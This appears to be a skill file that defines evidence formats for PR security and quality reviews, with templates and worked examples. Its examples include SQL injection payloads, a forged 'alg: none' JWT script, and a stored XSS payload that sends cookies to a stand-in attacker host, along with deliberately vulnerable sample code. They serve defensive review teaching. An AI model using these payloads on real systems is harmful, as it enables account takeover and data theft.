---
name: pr-review-evidence-formats
description: Defines what counts as valid evidence in PR reviews including code snippets, execution traces, exploitation scenarios, and test results. Use when validating findings, writing review reports, or verifying claims.
allowed-tools:
  - Read
---

# PR Review Evidence Formats

**Purpose**: Define what counts as valid, actionable evidence in PR security and quality reviews.

**When to Use**:
- Writing PR review reports
- Validating security findings
- Documenting breaking changes
- Proving logic bugs exist
- Checking evidence quality before publishing

---

## Core Principles

### 1. Show Don't Tell

**Bad**: "This function has a SQL injection vulnerability"
**Good**: Code snippet + execution trace + exploitation scenario

### 2. Reproducible Evidence

Evidence must allow reviewer to:
1. **Find** the issue (file:line reference)
2. **Understand** the issue (code snippet with context)
3. **Verify** the issue (execution trace or test)
4. **Assess** the impact (exploitation scenario or breaking change demo)

### 3. Minimal Sufficient Context

- Too little: Single line without context
- Too much: Entire 200-line function
- Just right: 5-10 lines showing issue + surrounding logic

---

## Evidence Types

| Type | When Required | Strength | Components |
|------|--------------|----------|------------|
| **Code Snippet** | Always | Weak alone | file:line + 5-10 lines context |
| **Execution Trace** | Logic/Security bugs | Medium | Step-by-step flow through code |
| **Exploitation Scenario** | Security issues | Strong | Attack vector → exploit → impact |
| **Test Result** | Breaking changes | Strong | Before/after test output |
| **Full Proof** | Critical findings | Strongest | All four components |

---

## Format 1: Code Snippet Standards

### Requirements

**Must include**:
- File path with line number
- 5-10 lines of context (not just problematic line)
- Clear indication of problematic code
- Brief explanation of issue

### Template

```markdown
## Finding: [Issue Name]

**Severity**: [Critical/High/Medium/Low]

**Location**: `path/to/file.py:123`

**Code**:
```python
# Context before (2-3 lines)
def vulnerable_function(user_input):
    # Clear setup showing data flow
    query = f"SELECT * FROM users WHERE id = {user_input}"  # ← ISSUE: SQL injection
    result = execute_query(query)
    return result
# Context after (1-2 lines)
```

**Issue**: User input directly interpolated into SQL query without sanitization.
```

### Examples

#### ❌ Bad: No Context

```markdown
**Code**: `query = f"SELECT * FROM users WHERE id = {user_input}"`
**Issue**: SQL injection
```

**Why bad**: Can't see where user_input comes from, what execute_query does, or how result is used.

#### ✅ Good: Sufficient Context

```markdown
**Location**: `api/user_handler.py:45`

**Code**:
```python
def get_user_by_id(request):
    user_input = request.GET.get('user_id')  # Untrusted input

    # Direct string interpolation - NO SANITIZATION
    query = f"SELECT * FROM users WHERE id = {user_input}"  # ← SQL INJECTION

    result = execute_query(query)  # Executes unsanitized query
    return jsonify(result)
```

**Issue**: user_id from request.GET directly interpolated into SQL query. No validation, escaping, or parameterization.
```

**Why good**: Shows data source (request.GET), problematic operation (f-string), and execution (execute_query).

---

## Format 2: Execution Trace

### Purpose

Show step-by-step flow through codebase demonstrating how issue manifests.

### Template

```markdown
## Execution Trace: [Issue Name]

**Scenario**: [What triggers this]

**Flow**:
1. **Entry**: `file1.py:10` - [What happens]
   ```python
   [Relevant code snippet]
   ```

2. **Step 2**: `file2.py:45` - [What happens next]
   ```python
   [Relevant code snippet]
   ```

3. **Issue**: `file3.py:89` - [Where problem occurs]
   ```python
   [Problematic code]
   ```

4. **Impact**: [What breaks/leaks/crashes]

**Result**: [Observable outcome]
```

### Example: SQL Injection Trace

```markdown
## Execution Trace: SQL Injection in User Search

**Scenario**: User submits search query with malicious payload

**Flow**:
1. **Entry**: `api/routes.py:23` - Request handler receives input
   ```python
   @app.route('/search')
   def search_users():
       query = request.args.get('q')  # User input: "1 OR 1=1--"
       return user_service.search(query)
   ```

2. **Pass-through**: `services/user_service.py:56` - No validation
   ```python
   def search(query):
       # No sanitization or validation
       return database.query_users(query)
   ```

3. **Vulnerability**: `database/queries.py:12` - Direct interpolation
   ```python
   def query_users(search_term):
       sql = f"SELECT * FROM users WHERE name LIKE '%{search_term}%'"  # ← INJECTION
       return db.execute(sql)
   ```

4. **Exploitation**: Attacker sends `?q=1%' OR '1'='1' --`
   - Resulting query: `SELECT * FROM users WHERE name LIKE '%1' OR '1'='1' --%'`
   - Returns ALL users (bypasses search filter)

**Result**: Complete user table dump, authentication bypass potential
```

### Example: Breaking Change Trace

```markdown
## Execution Trace: Breaking Change in API Response

**Scenario**: Existing client expects `user_id` field

**Flow**:
1. **Before**: `api/v1/users.py:45` (main branch)
   ```python
   def get_user(user_id):
       return {
           "user_id": user_id,  # ← Field exists
           "name": user.name
       }
   ```

2. **After**: `api/v1/users.py:45` (PR branch)
   ```python
   def get_user(user_id):
       return {
           "id": user_id,  # ← Renamed field
           "name": user.name
       }
   ```

3. **Client Code**: `client/user_handler.js:23` (external codebase)
   ```javascript
   function displayUser(response) {
       const userId = response.user_id;  // ← Expects old field name
       renderUserCard(userId);
   }
   ```

4. **Breakage**: `TypeError: Cannot read property 'user_id' of undefined`

**Result**: All API v1 clients break on deployment
```

### Example: Logic Bug Trace

```markdown
## Execution Trace: Off-by-One Error in Pagination

**Scenario**: User requests page 2 with 10 items per page

**Flow**:
1. **Request**: `GET /api/items?page=2&per_page=10`
   ```python
   # api/routes.py:67
   page = int(request.args.get('page', 1))      # page = 2
   per_page = int(request.args.get('per_page', 10))  # per_page = 10
   ```

2. **Offset Calculation**: `services/pagination.py:34`
   ```python
   def calculate_offset(page, per_page):
       # Off-by-one error: should be (page - 1) * per_page
       offset = page * per_page  # ← BUG: 2 * 10 = 20
       return offset
   ```

3. **Database Query**: `database/items.py:89`
   ```python
   def get_items(offset, limit):
       # Skips items 11-20, returns items 21-30
       return db.query(f"SELECT * FROM items LIMIT {limit} OFFSET {offset}")
   ```

4. **Result**:
   - Expected: Items 11-20
   - Actual: Items 21-30
   - Items 11-20 never accessible

**Impact**: Users can never view items 11-20, pagination broken
```

---

## Format 3: Exploitation Scenario

### Purpose

Demonstrate realistic attack vector showing how vulnerability is exploited and impact.

### Template

```markdown
## Exploitation Scenario: [Vulnerability Name]

**Attack Vector**: [How attacker accesses vulnerable code]

**Exploit**:
```
[Actual payload/request/input]
```

**Execution**:
1. [Step 1 of attack]
2. [Step 2 of attack]
3. [Result/impact]

**Impact**:
- [Security impact 1]
- [Security impact 2]
- [Severity justification]
```

### Example: SQL Injection

```markdown
## Exploitation Scenario: SQL Injection in User Search

**Attack Vector**: Unauthenticated user submits malicious search query

**Exploit**:
```bash
curl "https://api.example.com/search?q=admin%27%20OR%20%271%27%3D%271%27%20--"
```

**Execution**:
1. Attacker URL-encodes payload: `admin' OR '1'='1' --`
2. Server constructs query:
   ```sql
   SELECT * FROM users WHERE name LIKE '%admin' OR '1'='1' --%'
   ```
3. Query returns ALL users (OR clause always true)
4. Response includes admin credentials, emails, password hashes

**Response**:
```json
{
  "users": [
    {"id": 1, "name": "admin", "email": "admin@example.com", "password_hash": "$2b$12$..."},
    {"id": 2, "name": "user1", "email": "user1@example.com", "password_hash": "$2b$12$..."},
    ... (all 10,000 users)
  ]
}
```

**Impact**:
- Complete user database dump (PII exposure)
- Password hashes exposed (offline cracking possible)
- Admin accounts revealed (privilege escalation target)
- **CVSS 9.1 (Critical)**: No authentication required, high confidentiality impact
```

### Example: Authentication Bypass

```markdown
## Exploitation Scenario: JWT Signature Verification Bypass

**Attack Vector**: Any API endpoint requiring authentication

**Exploit**:
```python
import jwt

# Create token with "none" algorithm (no signature)
payload = {"user_id": 1, "role": "admin"}
fake_token = jwt.encode(payload, None, algorithm="none")

# Use in API request
headers = {"Authorization": f"Bearer {fake_token}"}
response = requests.get("https://api.example.com/admin/users", headers=headers)
```

**Execution**:
1. Attacker crafts JWT with `"alg": "none"` header
2. Sets arbitrary payload: `{"user_id": 1, "role": "admin"}`
3. Server code accepts unsigned token:
   ```python
   # auth/jwt_handler.py:23
   decoded = jwt.decode(token, verify=False)  # ← BUG: No signature verification
   user_id = decoded['user_id']
   ```
4. Attacker gains admin access without knowing secret key

**Impact**:
- Complete authentication bypass
- Privilege escalation to admin
- No credentials required
- **CVSS 9.8 (Critical)**: Network exploitable, no authentication, complete system compromise
```

### Example: XSS (Cross-Site Scripting)

```markdown
## Exploitation Scenario: Stored XSS in User Profile

**Attack Vector**: Authenticated user updates profile bio

**Exploit**:
```bash
POST /api/profile
Content-Type: application/json

{
  "bio": "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>"
}
```

**Execution**:
1. Attacker submits malicious bio with JavaScript payload
2. Server stores unescaped HTML:
   ```python
   # api/profile.py:45
   def update_profile(user_id, bio):
       user.bio = bio  # ← No sanitization
       db.save(user)
   ```
3. Victim views attacker's profile page
4. Browser renders bio HTML:
   ```html
   <div class="user-bio">
     <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
   </div>
   ```
5. JavaScript executes, sends victim's cookies to attacker

**Impact**:
- Session hijacking (victim's session cookie stolen)
- Account takeover (attacker uses stolen cookie)
- Persistent (affects all users viewing profile)
- **CVSS 7.1 (High)**: Requires authentication, but high impact on other users
```

---

## Format 4: Test Result Format

### Purpose

Show concrete proof of breaking change or bug through test failures.

### Template

```markdown
## Test Evidence: [Issue Name]

**Test**: [What test demonstrates issue]

**Setup**:
```python
[Test code or setup]
```

**Before PR** (main branch):
```
[Expected output/behavior]
```

**After PR** (feature branch):
```
[Actual output/behavior showing breakage]
```

**Failure Analysis**: [What broke and why]
```

### Example: Breaking Change

```markdown
## Test Evidence: Breaking Change in User API Response

**Test**: Existing integration test for user endpoint

**Setup**:
```python
# tests/test_user_api.py
def test_get_user_returns_expected_fields():
    response = client.get('/api/v1/users/123')
    data = response.json()

    # Clients expect these fields
    assert 'user_id' in data
    assert 'name' in data
    assert 'email' in data
```

**Before PR** (main branch):
```bash
$ pytest tests/test_user_api.py::test_get_user_returns_expected_fields -v

tests/test_user_api.py::test_get_user_returns_expected_fields PASSED [100%]

Response: {"user_id": 123, "name": "John Doe", "email": "john@example.com"}
```

**After PR** (feature branch):
```bash
$ pytest tests/test_user_api.py::test_get_user_returns_expected_fields -v

tests/test_user_api.py::test_get_user_returns_expected_fields FAILED [100%]

AssertionError: assert 'user_id' in {'id': 123, 'name': 'John Doe', 'email': 'john@example.com'}

Response: {"id": 123, "name": "John Doe", "email": "john@example.com"}
                ^^^ Field renamed from 'user_id' to 'id'
```

**Failure Analysis**: PR renames `user_id` → `id` in API response, breaking existing clients expecting `user_id` field.

**Impact**: API v1 breaking change requires major version bump and client migration
```

### Example: Logic Bug

```markdown
## Test Evidence: Pagination Off-by-One Error

**Test**: Pagination returns correct items for page 2

**Setup**:
```python
# tests/test_pagination.py
def test_page_2_returns_items_11_through_20():
    # Setup: Database has items 1-100
    for i in range(1, 101):
        db.create_item(id=i, name=f"Item {i}")

    # Request page 2 (items 11-20)
    response = client.get('/api/items?page=2&per_page=10')
    items = response.json()['items']

    # Verify correct items returned
    assert len(items) == 10
    assert items[0]['id'] == 11  # First item on page 2
    assert items[9]['id'] == 20  # Last item on page 2
```

**Expected Output**:
```bash
$ pytest tests/test_pagination.py::test_page_2_returns_items_11_through_20 -v

tests/test_pagination.py::test_page_2_returns_items_11_through_20 PASSED [100%]

Items returned: [11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
```

**Actual Output** (with bug):
```bash
$ pytest tests/test_pagination.py::test_page_2_returns_items_11_through_20 -v

tests/test_pagination.py::test_page_2_returns_items_11_through_20 FAILED [100%]

AssertionError: assert 21 == 11
  Expected first item: 11
  Actual first item: 21

Items returned: [21, 22, 23, 24, 25, 26, 27, 28, 29, 30]
                ^^^ Off by 10 (skipped items 11-20)
```

**Failure Analysis**:
- Bug location: `services/pagination.py:34`
- Issue: `offset = page * per_page` should be `(page - 1) * per_page`
- Result: Page 2 skips items 11-20, returns items 21-30
```

### Example: Coverage Report

```markdown
## Test Coverage Evidence: Critical Function Untested

**Function**: `validate_payment_amount()` in `payment/processor.py:123`

**Coverage Report**:
```bash
$ pytest --cov=payment --cov-report=term-missing

Name                    Stmts   Miss  Cover   Missing
-----------------------------------------------------
payment/processor.py      156     23    85%   123-145, 189-201
                                            ^^^^^^^^^ validate_payment_amount
```

**Uncovered Code**:
```python
# payment/processor.py:123-145
def validate_payment_amount(amount, currency):
    # CRITICAL: No test coverage for validation logic
    if amount < 0:
        raise ValueError("Negative amount")  # ← Not tested

    if currency not in SUPPORTED_CURRENCIES:
        raise ValueError("Unsupported currency")  # ← Not tested

    # Currency-specific max amounts
    max_amounts = {"USD": 10000, "EUR": 9000, "GBP": 8000}
    if amount > max_amounts.get(currency, 5000):
        raise ValueError("Amount exceeds limit")  # ← Not tested

    return True
```

**Risk**:
- Critical payment validation logic untested
- Edge cases (negative amounts, invalid currency, exceeding limits) not verified
- 23% of payment processor uncovered
- **Recommendation**: Add parametrized tests for all validation branches
```

---

## Evidence Quality Levels

| Level | Components | When Acceptable | Example Use Case |
|-------|-----------|-----------------|------------------|
| **Strong** | Code snippet + execution trace + exploitation/test + impact | Critical/High severity findings | SQL injection, auth bypass, breaking changes |
| **Medium** | Code snippet + execution trace OR test result | Medium severity, clear bugs | Logic errors, data leaks, API inconsistencies |
| **Weak** | Code snippet only with detailed explanation | Low severity, style issues | Code smells, minor inefficiencies, suggestions |
| **Insufficient** | Vague claim without proof | Never acceptable | "This looks vulnerable", "This might break" |

### Quality Assessment Checklist

**For each finding, verify**:
- [ ] File path with line number provided
- [ ] Code snippet has 5-10 lines context (not just problematic line)
- [ ] Issue clearly indicated in code (comment or highlighting)
- [ ] Execution trace shows step-by-step flow (for logic/security bugs)
- [ ] Exploitation scenario demonstrates realistic attack (for security issues)
- [ ] Test result shows before/after comparison (for breaking changes)
- [ ] Impact assessed with severity justification
- [ ] Recommendation provided (how to fix)

---

## Quick Reference Templates

### Security Vulnerability Template

```markdown
## [Vulnerability Type]: [Brief Description]

**Severity**: [Critical/High/Medium/Low] - [CVSS Score if applicable]

**Location**: `path/to/file.py:123`

**Vulnerable Code**:
```python
[5-10 lines with issue marked]
```

**Execution Trace**:
1. Entry: `file1.py:10` - [What happens]
2. Vulnerable point: `file2.py:45` - [Issue occurs]
3. Impact: [Observable result]

**Exploitation Scenario**:
- Attack vector: [How attacker accesses]
- Payload: `[actual exploit]`
- Result: [What attacker achieves]

**Impact**:
- [Security impact 1]
- [Security impact 2]

**Recommendation**:
```python
[Fixed code snippet]
```

**References**: [OWASP, CWE, CVE links if applicable]
```

### Breaking Change Template

```markdown
## Breaking Change: [What changed]

**Type**: [API/Database/Behavior] breaking change

**Location**: `path/to/file.py:123`

**Before** (main branch):
```python
[Original code/API]
```

**After** (PR branch):
```python
[Changed code/API]
```

**Impact**:
- Breaks: [What systems/clients affected]
- Requires: [Migration steps]

**Test Evidence**:
```bash
[Test failure output]
```

**Recommendation**:
- [ ] Bump major version (v1 → v2)
- [ ] Document migration guide
- [ ] Deprecate old API before removal
- [ ] Add compatibility layer
```

### Logic Bug Template

```markdown
## Logic Bug: [Brief Description]

**Location**: `path/to/file.py:123`

**Buggy Code**:
```python
[Code showing bug with context]
```

**Execution Trace**:
1. Input: [Example input]
2. Flow: [Step-by-step through code]
3. Output: [Incorrect result]

**Expected vs Actual**:
- Expected: [Correct behavior]
- Actual: [Buggy behavior]

**Test Case**:
```python
def test_bug_reproduction():
    result = buggy_function(input)
    assert result == expected  # FAILS
```

**Fix**:
```python
[Corrected code]
```
```

### Code Quality Issue Template

```markdown
## Code Quality: [Issue Type]

**Location**: `path/to/file.py:123`

**Current Code**:
```python
[Problematic code pattern]
```

**Issue**: [What's wrong - complexity, duplication, unclear logic]

**Recommendation**:
```python
[Improved code]
```

**Benefit**: [Why this is better]
```

---

## Summary

### Valid Evidence Components

1. **File:line reference** - Where to find issue
2. **Code snippet with context** - 5-10 lines showing issue
3. **Execution trace** - Step-by-step flow (for logic/security bugs)
4. **Exploitation scenario** - Realistic attack demonstration (for security)
5. **Test result** - Before/after comparison (for breaking changes)
6. **Impact assessment** - Severity and consequences
7. **Recommendation** - How to fix

### Evidence Quality Standards

**Strong Evidence** = Can reproduce issue without asking clarifying questions

**Weak Evidence** = Vague claims requiring back-and-forth

**No Evidence** = "Looks wrong" without proof

### Golden Rule

**Show the code, trace the execution, prove the impact, provide the fix.**

If you can't demonstrate it with evidence, don't claim it as a finding.
